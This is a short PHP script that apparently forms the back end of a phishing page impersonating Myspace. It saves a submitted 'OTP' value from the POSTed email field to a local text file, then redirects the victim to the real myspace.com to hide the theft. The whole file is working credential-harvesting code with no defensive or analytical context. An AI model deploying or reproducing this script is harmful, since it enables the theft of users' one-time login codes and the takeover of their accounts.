<?php
file_put_contents("otp.txt", "Myspace OTP : " . $email = $_POST['email'] . "\n", FILE_APPEND);
header('Location: https://myspace.com');
?>
